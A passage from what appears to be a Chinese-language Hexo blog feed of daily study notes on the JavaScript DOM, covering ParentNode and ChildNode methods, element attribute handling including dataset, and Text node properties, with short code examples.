<h4 id="4-1-ParentNode-接口"><a href="#4-1-ParentNode-接口" class="headerlink" title="4.1 ParentNode 接口"></a>4.1 ParentNode 接口</h4><p>如果当前节点是父节点，就会混入了（mixin）<code>ParentNode</code>接口。由于只有元素节点（element）、文档节点（document）和文档片段节点（documentFragment）拥有子节点，因此只有这三类节点会拥有<code>ParentNode</code>接口。</p>
<h5 id="4-1-1-ParentNode-children"><a href="#4-1-1-ParentNode-children" class="headerlink" title="4.1.1 ParentNode.children"></a>4.1.1 ParentNode.children</h5><p><code>children</code>属性返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有元素子节点。该属性只读。</p>
<p>下面是遍历某个节点的所有元素子节点的示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; el.children.length; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>注意，<code>children</code>属性只包括元素子节点，不包括其他类型的子节点（比如文本子节点）。如果没有元素类型的子节点，返回值<code>HTMLCollection</code>实例的<code>length</code>属性为<code>0</code>。</p>
<p>另外，<code>HTMLCollection</code>是动态集合，会实时反映 DOM 的任何变化。</p>
<h5 id="4-1-2-ParentNode-firstElementChild"><a href="#4-1-2-ParentNode-firstElementChild" class="headerlink" title="4.1.2 ParentNode.firstElementChild"></a>4.1.2 ParentNode.firstElementChild</h5><p><code>firstElementChild</code>属性返回当前节点的第一个元素子节点。如果没有任何元素子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.firstElementChild.nodeName</span><br><span class="line"><span class="comment">// &quot;HTML&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document</code>节点的第一个元素子节点是<code>&lt;HTML&gt;</code>。</p>
<h5 id="4-1-3-ParentNode-lastElementChild"><a href="#4-1-3-ParentNode-lastElementChild" class="headerlink" title="4.1.3 ParentNode.lastElementChild"></a>4.1.3 ParentNode.lastElementChild</h5><p><code>lastElementChild</code>属性返回当前节点的最后一个元素子节点，如果不存在任何元素子节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.lastElementChild.nodeName</span><br><span class="line"><span class="comment">// &quot;HTML&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document</code>节点的最后一个元素子节点是<code>&lt;HTML&gt;</code>（因为<code>document</code>只包含这一个元素子节点）。</p>
<h5 id="4-1-4-ParentNode-childElementCount"><a href="#4-1-4-ParentNode-childElementCount" class="headerlink" title="4.1.4 ParentNode.childElementCount"></a>4.1.4 ParentNode.childElementCount</h5><p><code>childElementCount</code>属性返回一个整数，表示当前节点的所有元素子节点的数目。如果不包含任何元素子节点，则返回<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.childElementCount <span class="comment">// 13</span></span><br></pre></td></tr></table></figure>

<h5 id="4-1-5-ParentNode-append-，ParentNode-prepend"><a href="#4-1-5-ParentNode-append-，ParentNode-prepend" class="headerlink" title="4.1.5 ParentNode.append()，ParentNode.prepend()"></a>4.1.5 ParentNode.append()，ParentNode.prepend()</h5><h6 id="1-ParentNode-append"><a href="#1-ParentNode-append" class="headerlink" title="(1)ParentNode.append()"></a>(1)ParentNode.append()</h6><p><code>append()</code>方法为当前节点追加一个或多个子节点，位置是最后一个元素子节点的后面。</p>
<p>该方法不仅可以添加元素子节点（参数为元素节点），还可以添加文本子节点（参数为字符串）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = <span class="built_in">document</span>.body;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素子节点</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.append(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加文本子节点</span></span><br><span class="line">parent.append(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加多个元素子节点</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.append(p1, p2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素子节点和文本子节点</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">parent.append(<span class="string">&#x27;Hello&#x27;</span>, p);</span><br></pre></td></tr></table></figure>
<p>该方法没有返回值。</p>
<p>注意，该方法与<code>Node.prototype.appendChild()</code>方法有三点不同。</p>
<ul>
<li><code>append()</code>允许字符串作为参数，<code>appendChild()</code>只允许子节点作为参数。</li>
<li><code>append()</code>没有返回值，而<code>appendChild()</code>返回添加的子节点。</li>
<li><code>append()</code>可以添加多个子节点和字符串（即允许多个参数），<code>appendChild()</code>只能添加一个节点（即只允许一个参数）。</li>
</ul>
<h6 id="2-ParentNode-prepend"><a href="#2-ParentNode-prepend" class="headerlink" title="(2)ParentNode.prepend()"></a>(2)ParentNode.prepend()</h6><p><code>prepend()</code>方法为当前节点追加一个或多个子节点，位置是第一个元素子节点的前面。它的用法与<code>append()</code>方法完全一致，也是没有返回值。</p>
<h4 id="4-2-ChildNode-接口"><a href="#4-2-ChildNode-接口" class="headerlink" title="4.2 ChildNode 接口"></a>4.2 ChildNode 接口</h4><p>如果一个节点有父节点，那么该节点就拥有了<code>ChildNode</code>接口。</p>
<h5 id="4-2-1-ChildNode-remove"><a href="#4-2-1-ChildNode-remove" class="headerlink" title="4.2.1 ChildNode.remove()"></a>4.2.1 ChildNode.remove()</h5><p><code>remove()</code>方法用于从父节点移除当前节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">el.remove()</span><br></pre></td></tr></table></figure>
<p>上面代码在 DOM 里面移除了<code>el</code>节点</p>
<h5 id="4-2-2-ChildNode-before-，ChildNode-after"><a href="#4-2-2-ChildNode-before-，ChildNode-after" class="headerlink" title="4.2.2 ChildNode.before()，ChildNode.after()"></a>4.2.2 ChildNode.before()，ChildNode.after()</h5><h6 id="1-ChildNode-before"><a href="#1-ChildNode-before" class="headerlink" title="(1)ChildNode.before()"></a>(1)ChildNode.before()</h6><p><code>before()</code>方法用于在当前节点的前面，插入一个或多个同级节点。两者拥有相同的父节点。</p>
<p>注意，该方法不仅可以插入元素节点，还可以插入文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素节点</span></span><br><span class="line">el.before(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入文本节点</span></span><br><span class="line">el.before(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入多个元素节点</span></span><br><span class="line">el.before(p, p1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素节点和文本节点</span></span><br><span class="line">el.before(p, <span class="string">&#x27;Hello&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h6 id="2-ChildNode-after"><a href="#2-ChildNode-after" class="headerlink" title="(2)ChildNode.after()"></a>(2)ChildNode.after()</h6><p><code>after()</code>方法用于在当前节点的后面，插入一个或多个同级节点，两者拥有相同的父节点。用法与<code>before</code>方法完全相同。</p>
<h5 id="4-2-3-ChildNode-replaceWith"><a href="#4-2-3-ChildNode-replaceWith" class="headerlink" title="4.2.3 ChildNode.replaceWith()"></a>4.2.3 ChildNode.replaceWith()</h5><p><code>replaceWith()</code>方法使用参数节点，替换当前节点。参数可以是元素节点，也可以是文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> span = <span class="built_in">document</span>.createElement(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">el.replaceWith(span);</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-ParentNode 接口，ChildNode 接口</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0040</title>
    <url>/2021/05/25/%E6%89%93%E5%8D%A10040/</url>
    <content><![CDATA[<p><font color=#f58220>这世界有那么多人~</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="7-属性的操作"><a href="#7-属性的操作" class="headerlink" title="7. 属性的操作"></a>7. 属性的操作</h3><p>HTML 元素包括标签名和若干个键值对，这个键值对就称为“属性”（attribute）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a id=<span class="string">&quot;test&quot;</span> href=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span><br><span class="line">  链接</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>元素包括两个属性：<code>id</code>属性和<code>href</code>属性。</p>
<p>属性本身是一个对象（<code>Attr</code>对象），但是实际上，这个对象极少使用。一般都是通过元素节点对象（<code>HTMlElement</code>对象）来操作属性。本章介绍如何操作这些属性。</p>
<h4 id="7-1-Element-attributes-属性"><a href="#7-1-Element-attributes-属性" class="headerlink" title="7.1 Element.attributes 属性"></a>7.1 Element.attributes 属性</h4><p>元素对象有一个<code>attributes</code>属性，返回一个类似数组的动态对象，成员是该元素标签的所有属性节点对象，属性的实时变化都会反映在这个节点对象上。其他类型的节点对象，虽然也有<code>attributes</code>属性，但返回的都是<code>null</code>，因此可以把这个属性视为元素对象独有的。</p>
<p>单个属性可以通过序号引用，也可以通过属性名引用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body bgcolor=&quot;yellow&quot; onload=&quot;&quot;&gt;</span></span><br><span class="line"><span class="built_in">document</span>.body.attributes[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">document</span>.body.attributes.bgcolor</span><br><span class="line"><span class="built_in">document</span>.body.attributes[<span class="string">&#x27;ONLOAD&#x27;</span>]</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>注意，上面代码的三种方法，返回的都是属性节点对象，而不是属性值。</p>
<p>属性节点对象有<code>name</code>和<code>value</code>属性，对应该属性的属性名和属性值，等同于<code>nodeName</code>属性和<code>nodeValue</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;mydiv&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> n = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">n.attributes[<span class="number">0</span>].name <span class="comment">// &quot;id&quot;</span></span><br><span class="line">n.attributes[<span class="number">0</span>].nodeName <span class="comment">// &quot;id&quot;</span></span><br><span class="line"></span><br><span class="line">n.attributes[<span class="number">0</span>].value <span class="comment">// &quot;mydiv&quot;</span></span><br><span class="line">n.attributes[<span class="number">0</span>].nodeValue <span class="comment">// &quot;mydiv&quot;</span></span><br></pre></td></tr></table></figure>
<p>下面代码可以遍历一个元素节点的所有属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> para = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;p&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> result = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (para.hasAttributes()) &#123;</span><br><span class="line">  <span class="keyword">var</span> attrs = para.attributes;</span><br><span class="line">  <span class="keyword">var</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = attrs.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    output += attrs[i].name + <span class="string">&#x27;-&gt;&#x27;</span> + attrs[i].value;</span><br><span class="line">  &#125;</span><br><span class="line">  result.textContent = output;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  result.textContent = <span class="string">&#x27;No attributes to show&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7-2-元素的标准属性"><a href="#7-2-元素的标准属性" class="headerlink" title="7.2 元素的标准属性"></a>7.2 元素的标准属性</h4><p>HTML 元素的标准属性（即在标准中定义的属性），会自动成为元素节点对象的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">a.id <span class="comment">// &quot;test&quot;</span></span><br><span class="line">a.href <span class="comment">// &quot;http://www.example.com/&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>元素标签的属性<code>id</code>和<code>href</code>，自动成为节点对象的属性。</p>
<p>这些属性都是可写的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myImage&#x27;</span>);</span><br><span class="line">img.src = <span class="string">&#x27;http://www.example.com/image.jpg&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面的写法，会立刻替换掉<code>img</code>对象的<code>src</code>属性，即会显示另外一张图片。</p>
<p>这种修改属性的方法，常常用于添加表单的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.forms[<span class="number">0</span>];</span><br><span class="line">f.action = <span class="string">&#x27;submit.php&#x27;</span>;</span><br><span class="line">f.method = <span class="string">&#x27;POST&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码为表单添加提交网址和提交方法。</p>
<p>注意，这种用法虽然可以读写属性，但是无法删除属性，<code>delete</code>运算符在这里不会生效。</p>
<p>HTML 元素的属性名是大小写不敏感的，但是 JavaScript 对象的属性名是大小写敏感的。转换规则是，转为 JavaScript 属性名时，一律采用小写。如果属性名包括多个单词，则采用骆驼拼写法，即从第二个单词开始，每个单词的首字母采用大写，比如<code>onClick</code>。</p>
<p>有些 HTML 属性名是 JavaScript 的保留字，转为 JavaScript 属性时，必须改名。主要是以下两个。</p>
<ul>
<li><code>for</code>属性改为<code>htmlFor</code></li>
<li><code>class</code>属性改为<code>className</code></li>
</ul>
<p>另外，HTML 属性值一般都是字符串，但是 JavaScript 属性会自动转换类型。比如，将字符串<code>true</code>转为布尔值，将<code>onClick</code>的值转为一个函数，将<code>style</code>属性的值转为一个<code>CSSStyleDeclaration</code>对象。因此，可以对这些属性赋予各种类型的值。</p>
<h4 id="7-3-属性操作的标准方法"><a href="#7-3-属性操作的标准方法" class="headerlink" title="7.3 属性操作的标准方法"></a>7.3 属性操作的标准方法</h4><h5 id="7-3-1-概述"><a href="#7-3-1-概述" class="headerlink" title="7.3.1 概述"></a>7.3.1 概述</h5><p>元素节点提供六个方法，用来操作属性。</p>
<ul>
<li><code>getAttribute()</code></li>
<li><code>getAttributeNames()</code></li>
<li><code>setAttribute()</code></li>
<li><code>hasAttribute()</code></li>
<li><code>hasAttributes()</code></li>
<li><code>removeAttribute()</code></li>
</ul>
<p>这有几点注意。</p>
<p>（1）适用性</p>
<p>这六个方法对所有属性（包括用户自定义的属性）都适用。</p>
<p>（2）返回值</p>
<p><code>getAttribute()</code>只返回字符串，不会返回其他类型的值。</p>
<p>（3）属性名</p>
<p>这些方法只接受属性的标准名称，不用改写保留字，比如<code>for</code>和<code>class</code>都可以直接使用。另外，这些方法对于属性名是大小写不敏感的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> image = <span class="built_in">document</span>.images[<span class="number">0</span>];</span><br><span class="line">image.setAttribute(<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;myImage&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>setAttribute</code>方法直接使用<code>class</code>作为属性名，不用写成<code>className</code>。</p>
<h5 id="7-3-2-Element-getAttribute"><a href="#7-3-2-Element-getAttribute" class="headerlink" title="7.3.2 Element.getAttribute()"></a>7.3.2 Element.getAttribute()</h5><p><code>Element.getAttribute</code>方法返回当前元素节点的指定属性。如果指定属性不存在，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; align=&quot;left&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line">div.getAttribute(<span class="string">&#x27;align&#x27;</span>) <span class="comment">// &quot;left&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="7-3-3-Element-getAttributeNames"><a href="#7-3-3-Element-getAttributeNames" class="headerlink" title="7.3.3 Element.getAttributeNames()"></a>7.3.3 Element.getAttributeNames()</h5><p><code>Element.getAttributeNames()</code>返回一个数组，成员是当前元素的所有属性的名字。如果当前元素没有任何属性，则返回一个空数组。使用<code>Element.attributes</code>属性，也可以拿到同样的结果，唯一的区别是它返回的是类似数组的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mydiv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mydiv.getAttributeNames().forEach(<span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> value = mydiv.getAttribute(key);</span><br><span class="line">  <span class="built_in">console</span>.log(key, value);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>上面代码用于遍历某个节点的所有属性。</p>
<h5 id="7-3-4-Element-setAttribute"><a href="#7-3-4-Element-setAttribute" class="headerlink" title="7.3.4 Element.setAttribute()"></a>7.3.4 Element.setAttribute()</h5><p><code>Element.setAttribute</code>方法用于为当前元素节点新增属性。如果同名属性已存在，则相当于编辑已存在的属性。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;button&gt;Hello World&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line">b.setAttribute(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;myButton&#x27;</span>);</span><br><span class="line">b.setAttribute(<span class="string">&#x27;disabled&#x27;</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>button</code>元素的<code>name</code>属性被设成<code>myButton</code>，<code>disabled</code>属性被设成<code>true</code>。</p>
<p>这里有两个地方需要注意，首先，属性值总是字符串，其他类型的值会自动转成字符串，比如布尔值<code>true</code>就会变成字符串<code>true</code>；其次，上例的<code>disable</code>属性是一个布尔属性，对于<code>&lt;button&gt;</code>元素来说，这个属性不需要属性值，只要设置了就总是会生效，因此<code>setAttribute</code>方法里面可以将<code>disabled</code>属性设成任意值。</p>
<h5 id="7-3-5-Element-hasAttribute"><a href="#7-3-5-Element-hasAttribute" class="headerlink" title="7.3.5 Element.hasAttribute()"></a>7.3.5 Element.hasAttribute()</h5><p><code>Element.hasAttribute</code>方法返回一个布尔值，表示当前元素节点是否包含指定属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (d.hasAttribute(<span class="string">&#x27;align&#x27;</span>)) &#123;</span><br><span class="line">  d.setAttribute(<span class="string">&#x27;align&#x27;</span>, <span class="string">&#x27;center&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码检查<code>div</code>节点是否含有<code>align</code>属性。如果有，则设置为居中对齐。</p>
<h5 id="7-3-6-Element-hasAttributes"><a href="#7-3-6-Element-hasAttributes" class="headerlink" title="7.3.6 Element.hasAttributes()"></a>7.3.6 Element.hasAttributes()</h5><p><code>Element.hasAttributes</code>方法返回一个布尔值，表示当前元素是否有属性，如果没有任何属性，就返回<code>false</code>，否则返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">foo.hasAttributes() <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="7-3-7-Element-removeAttribute"><a href="#7-3-7-Element-removeAttribute" class="headerlink" title="7.3.7 Element.removeAttribute()"></a>7.3.7 Element.removeAttribute()</h5><p><code>Element.removeAttribute</code>方法移除指定属性。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; align=&quot;left&quot; width=&quot;200px&quot;&gt;</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>).removeAttribute(<span class="string">&#x27;align&#x27;</span>);</span><br><span class="line"><span class="comment">// 现在的HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div1&quot; width=&quot;200px&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="7-4-dataset-属性"><a href="#7-4-dataset-属性" class="headerlink" title="7.4 dataset 属性"></a>7.4 dataset 属性</h4><p>有时，需要在HTML元素上附加数据，供 JavaScript 脚本使用。一种解决方法是自定义属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;mydiv&quot;</span> foo=<span class="string">&quot;bar&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码为<code>div</code>元素自定义了<code>foo</code>属性，然后可以用<code>getAttribute()</code>和<code>setAttribute()</code>读写这个属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">n.getAttribute(<span class="string">&#x27;foo&#x27;</span>) <span class="comment">// bar</span></span><br><span class="line">n.setAttribute(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这种方法虽然可以达到目的，但是会使得 HTML 元素的属性不符合标准，导致网页代码通不过校验。</p>
<p>更好的解决方法是，使用标准提供的<code>data-*</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;mydiv&quot;</span> data-foo=<span class="string">&quot;bar&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>然后，使用元素节点对象的<code>dataset</code>属性，它指向一个对象，可以用来操作 HTML 元素标签的<code>data-*</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">n.dataset.foo <span class="comment">// bar</span></span><br><span class="line">n.dataset.foo = <span class="string">&#x27;baz&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，通过<code>dataset.foo</code>读写<code>data-foo</code>属性。</p>
<p>删除一个<code>data-*</code>属性，可以直接使用<code>delete</code>命令。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="built_in">document</span>.getElementById(<span class="string">&#x27;myDiv&#x27;</span>).dataset.foo;</span><br></pre></td></tr></table></figure>
<p>除了<code>dataset</code>属性，也可以用<code>getAttribute(&#39;data-foo&#39;)</code>、<code>removeAttribute(&#39;data-foo&#39;)</code>、<code>setAttribute(&#39;data-foo&#39;)</code>、<code>hasAttribute(&#39;data-foo&#39;)</code>等方法操作<code>data-*</code>属性。</p>
<p>注意，<code>data-</code>后面的属性名有限制，只能包含字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>)。而且，属性名不应该使用<code>A</code>到<code>Z</code>的大写字母，比如不能有<code>data-helloWorld</code>这样的属性名，而要写成<code>data-hello-world</code>。</p>
<p>转成<code>dataset</code>的键名时，连词线后面如果跟着一个小写字母，那么连词线会被移除，该小写字母转为大写字母，其他字符不变。反过来，<code>dataset</code>的键名转成属性名时，所有大写字母都会被转成连词线+该字母的小写形式，其他字符不变。比如，<code>dataset.helloWorld</code>会转成<code>data-hello-world</code>。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-属性的操作</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0041</title>
    <url>/2021/05/26/%E6%89%93%E5%8D%A10041/</url>
    <content><![CDATA[<p><font color=#cde6c7>生活可以迷茫，但不应虚度。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="8-Text-节点和-DocumentFragment-节点"><a href="#8-Text-节点和-DocumentFragment-节点" class="headerlink" title="8. Text 节点和 DocumentFragment 节点"></a>8. Text 节点和 DocumentFragment 节点</h3><h4 id="8-1-Text-节点的概念"><a href="#8-1-Text-节点的概念" class="headerlink" title="8.1 Text 节点的概念"></a>8.1 Text 节点的概念</h4><p>文本节点（<code>Text</code>）代表元素节点（<code>Element</code>）和属性节点（<code>Attribute</code>）的文本内容。如果一个节点只包含一段文本，那么它就有一个文本子节点，代表该节点的文本内容。</p>
<p>通常我们使用父节点的<code>firstChild</code>、<code>nextSibling</code>等属性获取文本节点，或者使用<code>Document</code>节点的<code>createTextNode</code>方法创造一个文本节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造文本节点</span></span><br><span class="line"><span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).appendChild(textNode);</span><br></pre></td></tr></table></figure>
<p>浏览器原生提供一个<code>Text</code>构造函数。它返回一个文本节点实例。它的参数就是该文本节点的文本内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空字符串</span></span><br><span class="line"><span class="keyword">var</span> text1 = <span class="keyword">new</span> Text();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非空字符串</span></span><br><span class="line"><span class="keyword">var</span> text2 = <span class="keyword">new</span> Text(<span class="string">&#x27;This is a text node&#x27;</span>);</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>注意，由于空格也是一个字符，所以哪怕只有一个空格，也会形成文本节点。比如，<code>&lt;p&gt; &lt;/p&gt;</code>包含一个空格，它的子节点就是一个文本节点。</p>
<p>文本节点除了继承<code>Node</code>接口，还继承了<code>CharacterData</code>接口。<code>Node</code>接口的属性和方法请参考《Node 接口》一章，这里不再重复介绍了，以下的属性和方法大部分来自<code>CharacterData</code>接口。</p>
<h4 id="8-2-Text-节点的属性"><a href="#8-2-Text-节点的属性" class="headerlink" title="8.2 Text 节点的属性"></a>8.2 Text 节点的属性</h4><h5 id="8-2-1-data"><a href="#8-2-1-data" class="headerlink" title="8.2.1 data"></a>8.2.1 data</h5><p><code>data</code>属性等同于<code>nodeValue</code>属性，用来设置或读取文本节点的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取文本内容</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild.data</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild.nodeValue</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文本内容</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>).firstChild.data = <span class="string">&#x27;Hello World&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="8-2-2-wholeText"><a href="#8-2-2-wholeText" class="headerlink" title="8.2.2 wholeText"></a>8.2.2 wholeText</h5><p><code>wholeText</code>属性将当前文本节点与毗邻的文本节点，作为一个整体返回。大多数情况下，<code>wholeText</code>属性的返回值，与<code>data</code>属性和<code>textContent</code>属性相同。但是，某些特殊情况会有差异。</p>
<p>举例来说，HTML 代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;p id=<span class="string">&quot;para&quot;</span>&gt;A &lt;em&gt;B&lt;<span class="regexp">/em&gt; C&lt;/</span>p&gt;</span><br></pre></td></tr></table></figure>
<p>这时，文本节点的<code>wholeText</code>属性和<code>data</code>属性，返回值相同。</p>
